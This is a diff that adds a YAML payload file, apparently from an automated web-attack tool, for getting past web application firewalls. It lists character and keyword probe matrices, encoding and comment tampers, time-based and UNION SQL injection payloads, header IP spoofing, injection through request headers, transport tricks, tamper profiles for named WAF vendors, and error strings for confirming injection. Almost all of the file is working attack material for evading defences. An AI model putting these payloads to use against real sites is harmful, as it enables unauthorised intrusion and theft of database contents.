@@ -1,0 +1,356 @@
+metadata:
+  category: waf-bypass
+  description: Char/keyword matrix + encoding tampers for WAF pre-mapping
+  version: '1.1'
+  sources:
+  - PayloadsAllTheThings
+  - internal char/keyword matrices
+  protocol: Run matrix BEFORE auto_sqli/xss/ssti. Store block signatures in case ledger.
+char_matrix:
+  schema_version: '1.0'
+  description: WAF character matrix for pre-injection mapping
+  chars:
+  - ''''
+  - '"'
+  - ;
+  - --
+  - '#'
+  - /*
+  - '*/'
+  - '='
+  - <
+  - '>'
+  - '|'
+  - '&'
+  - '!'
+  - (
+  - )
+  - '['
+  - ']'
+  - '{'
+  - '}'
+  - "\t"
+  - '
+
+    '
+  - "\r"
+  - '%00'
+  - '%0a'
+  - '%0d'
+  - '%09'
+  - /**/
+  - '||'
+  - '&&'
+  - +
+  - ','
+  - '`'
+  - \
+  - ＇
+  - ；
+  - ｜
+  encodings:
+  - raw
+  - url
+  - double_url
+  - unicode_fullwidth
+  - comment_embed
+  channels:
+  - query
+  - body_form
+  - body_json
+  - header_ua
+  - header_x_forwarded
+  probe_template:
+    description: Replace PARAM with baseline then single-char injection
+    baseline_value: test
+    probe_value: test{char}
+    observe:
+    - status
+    - body_len
+    - block_signature
+    - location
+    - classification
+  notes:
+  - Run before auto_sqli/xss/ssti
+  - Store result in case ledger coverage
+  - Fullwidth quotes often bypass app-layer Chinese WAF
+keyword_matrix:
+  schema_version: '1.0'
+  description: WAF keyword matrix for injection prep
+  keywords:
+  - AND
+  - OR
+  - UNION
+  - SELECT
+  - INSERT
+  - UPDATE
+  - DELETE
+  - SLEEP
+  - BENCHMARK
+  - WAITFOR
+  - XOR
+  - SCRIPT
+  - IMG
+  - ONERROR
+  - SVG
+  - ALERT
+  - SYSTEM
+  - RUNTIME
+  - EVAL
+  - CONFIG
+  - '{{'
+  - ${
+  - <%
+  - '#{'
+  forms:
+  - alone
+  - spaced
+  - lower
+  - mixed_case
+  - concat_comment
+  - double_url
+  examples:
+    alone: UNION
+    spaced: UNI ON
+    mixed_case: UnIoN
+    concat_comment: UNI/**/ON
+    double_url: '%2553ELECT'
+  observe:
+  - status
+  - body_len
+  - block_signature
+  - classification
+  follow_up: If UNION blocked but concat_comment allowed, prefer comment tampers
+encoding_tampers:
+  url:
+  - '%27'
+  - '%22'
+  - '%3Cscript%3E'
+  - '%0a'
+  - '%0d%0a'
+  - '%09'
+  double_url:
+  - '%2527'
+  - '%252f'
+  - '%253C'
+  - '%2555%254e%2549%254f%254e'
+  unicode_fullwidth:
+  - ＇
+  - ＂
+  - ＜
+  - ＞
+  - ／
+  - ；
+  - ｜
+  comment_embed_sql:
+  - UNI/**/ON
+  - SEL/**/ECT
+  - UN/**/ION%0aSELECT
+  case_mix:
+  - UnIoN
+  - SeLeCt
+  - oR
+  - aNd
+  json_unicode:
+  - \u0027
+  - \u003cscript\u003e
+sql_function_alternatives:
+  sleep_alts:
+  - AND (SELECT * FROM (SELECT(SLEEP(5)))a)
+  - AND GREATEST(IF(1=1,SLEEP(5),0),0)
+  - ;WAITFOR DELAY '0:0:5'--
+  - AND pg_sleep(5)
+  - AND DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),5)=1
+  union_alts:
+  - /*!UNION*/ /*!SELECT*/
+  - '%55NION %53ELECT'
+  - UNION%0ASELECT
+  - UNION ALL SELECT
+block_signatures:
+  observe:
+  - status
+  - body_len
+  - title
+  - classification
+  common_pages:
+  - 403 Forbidden
+  - 访问被拦截
+  - WAF
+  - 安全狗
+  - 云锁
+  - 雷池
+  - 请求含有非法字符
+  - blocked
+  - Request Rejected
+false_positives:
+- App 500 on single quote alone is signal, not confirmed SQLi
+- Length change without semantic difference -> retest with marker
+
+# ── bingo v7.0.66 import (2026-08-02) ─────────────────────────────────────────
+bingo_sqli_function_alternatives:
+  substr_alts:
+  - MID({str},{pos},1)
+  - RIGHT(LEFT({str},{pos}),1)
+  - RIGHT(REVERSE(LEFT(REVERSE({str}),{rpos})),1)
+  - LPAD(RPAD({str},{pos},0x20),1,0x20)
+  - TRIM(LEADING SUBSTR({str},1,{pos1}) FROM LEFT({str},{pos}))
+  - INSERT({str},1,{pos1},0x20)
+  - CONVERT(SUBSTR({str},{pos},1) USING utf8)
+  - ELT(1,SUBSTR({str},{pos},1))
+  - IF(1=1,SUBSTR({str},{pos},1),0)
+  ascii_alts:
+  - ORD({char})
+  - CONV(HEX({char}),16,10)
+  - WEIGHT_STRING({char} AS CHAR(1) LEVEL 1)
+  - FIND_IN_SET({char},CHAR(48,49,50,51,52,53,54,55,56,57))
+  - STRCMP({char},CHAR({n}))
+  sleep_alts_advanced:
+  - SLEEP/***/({n})
+  - SLEEP/***/({n},1)
+  - /*!SLEEP*/({n})
+  - SLEEP%09({n})
+  - GET_LOCK(0x61,{n})
+  - WAIT_FOR_EXECUTED_GTID_SET('a',{n})
+  - (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)
+  - (SELECT count(*) FROM sysusers sys1, sysusers sys2, sysusers sys3, sysusers sys4)
+  - (SELECT count(*) FROM sqlite_master t1, sqlite_master t2, sqlite_master t3)
+  select_alts:
+  - SELECT/**/
+  - SE/**/LECT
+  - '%53ELECT'
+  - /*!50000SELECT*/
+  union_alts_advanced:
+  - UNION/**/
+  - UNION%0a
+  - UNION%09
+  - UN/**/ION
+  - /*!50000UNION*/
+  and_alts_advanced:
+  - '&&'
+  - AND/**/
+  - '%26%26'
+  - AND%0a
+  - /*!AND*/
+  - /*!12345AND*/
+  - AnD
+  - AND%09
+  - '%09AND%09'
+  - '%00AND%00'
+  - AND%0d%0a
+  - XOR/**/0/**/OR
+  - '%2526%2526'
+  or_alts_advanced:
+  - '||'
+  - OR/**/
+  - '%7c%7c'
+  - OR%0a
+  - /*!12345OR*/
+  - Or
+  - OR%09
+  - '%09OR%09'
+  - '%00OR%00'
+  - OR%0d%0a
+  - '%257c%257c'
+  comparison_alts:
+  - LIKE
+  - REGEXP
+  - RLIKE
+  - BETWEEN {v} AND {v}
+  - IN({v})
+  - GREATEST({a},{b})={a}
+  - LEAST({a},{b})={a}
+  - NOT BETWEEN 0 AND {b}
+  - '!<'
+  - '!>'
+  info_schema_alts:
+  - information_schema/**/.tables
+  - mysql.innodb_table_stats
+  - sys.schema_tables
+  - performance_schema.tables
+  function_bypasses:
+  - name: case_when
+    pattern: '\bIF\s*\(\s*(.+?)\s*,\s*(.+?)\s*,\s*(.+?)\s*\)'
+    replace: "CASE/**/WHEN/**/{1}/**/THEN/**/{2}/**/ELSE/**/{3}/**/END"
+  - name: heavy_subquery
+    pattern: '\bSLEEP\s*\(\s*(\d+)\s*\)'
+    replace: "(SELECT/**/1/**/FROM/**/(SELECT/**/count(*)/**/FROM/**/information_schema.columns/**/A,information_schema.columns/**/B)x)"
+  - name: logical_operator
+    pattern: '\bAND\b|\bOR\b'
+    replace: '&&' # OR → || handled separately
+  - name: union_newline
+    pattern: '\bUNION\s+SELECT\b'
+    replace: UNION%0aSELECT
+unicode_bypasses:
+- fullwidth_quote: "' → ＇, \" → ＂"
+- overlong_slash: / → %c0%af
+- null_byte_inject: SELECT→SELECT%00
+- html_entity_sel: SELECT→S&#69;LECT, UNION→UNI&#79;N, AND→AN&#68;
+header_bypasses:
+- X-Forwarded-For: 127.0.0.1
+- X-Forwarded-For: 10.0.0.1
+- X-Real-IP: 127.0.0.1
+- X-Originating-IP: 127.0.0.1
+- X-Client-IP: 127.0.0.1
+- True-Client-IP: 127.0.0.1
+- Cluster-Client-IP: 127.0.0.1
+- Forwarded: for=127.0.0.1;proto=https
+waf_profiles:
+  cloudflare: [space2comment, randomcase, versionedmorekeywords, charencode]
+  akamai: [space2randomblank, chardoubleencode, versionedmorekeywords]
+  modsecurity: [modsecurityversioned, space2comment, randomcase]
+  f5bigip: [space2mssqlblank, charencode, randomcase]
+  imperva: [securesphere, space2comment, versionedmorekeywords]
+  nginx: [luanginx, space2plus, randomcase]
+  gnuboard: [gnuboard_bypass, space2comment, randomcase]
+  wapples_kr: [korean_waf_bypass, space2comment, versionedmorekeywords]
+  genian_kr: [korean_comment_bypass, space2hash, randomcase]
+  cloudbric_kr: [korean_waf_bypass, space2mysqlblank, randomcomments]
+  kisa_kr: [space2tab, versionedmorekeywords, randomcase, nullbyte]
+korean_waf_bypass:
+- 'UNION→UNI%0aON'
+- 'SELECT→SE%0aLECT'
+- 'WHERE→WH%0aERE'
+- 'kw → /**//*!kw*//**/'
+right_only_extraction_strategy: |
+  str LIKE 'k%'  → 首字符判定 (无函数名最抗WAF)
+  RIGHT(REVERSE(str),1) = 首字符
+  str BETWEEN 'a' AND 'm' → 二分
+  str REGEXP '^k'
+  FIND_IN_SET(LEFT(str,1),'k,a,c,p,r') > 0
+transport_bypasses:
+- HPP: '?id=1&id=payload'
+- JSON_array_body: '{"id":[1,"payload"]}'
+- gzip_post: Content-Encoding: gzip
+- param_bomb: 500个 _x{i}=0 假参数
+- path_normalize: //page.php
+- chunked_te: 3/5/7/1字节分块
+- http2_request
+header_injection_sqli:
+- header: X-Forwarded-For
+  payload: "127.0.0.1' {condition} --"
+- header: User-Agent
+  payload: "Mozilla/5.0' {condition} -- -"
+- header: Referer
+  payload: "https://www.google.com/search?q=1' {condition} -- -"
+- header: X-Real-IP
+  payload: "192.168.1.1' {condition} --"
+- header: Accept-Language
+  payload: "ko-KR,ko' {condition} --"
+error_based_verification:
+- baseline 不含 '~~' 分隔符
+- EXTRACTVALUE(1,CONCAT(0x7e7e,0x<BINGOVERIF hex>)) 响应必须含该token
+- XPATH 关键词不在 baseline
+sql_error_multilang:
+  universal: [you have an error in your sql syntax, unclosed quotation mark, 'ora-[0-9]{5}', 1064.*you have an error, 1054.*unknown column, 1146.*table.*doesn.*exist]
+  en: [sql error, database error, query failed, syntax error]
+  ko: ['sql 오류', '데이터베이스 오류', '쿼리 오류']
+  zh: [sql错误, 数据库错误, 查询失败, 语法错误]
+  ja: ['sqlエラー', 'データベースエラー', '構文エラー']
+  ru: ['ошибка sql', 'ошибка базы данных']
+  es: ['error sql', 'error de base de datos']
+  ar: ['خطأ sql', 'خطأ في قاعدة البيانات']
+sql_error_false_positive_exclude:
+- ko: [잘못된 접근, 존재하지 않는, 정상적인 접근이 아닙니다, 접근 권한이 없습니다]
+- en: [page not found, access denied, forbidden, not authorized, login required]
+- zh: [页面不存在, 访问被拒绝, 无权访问, 请先登录]
+- ja: ['ページが見つかりません', 'アクセスが拒否されました']
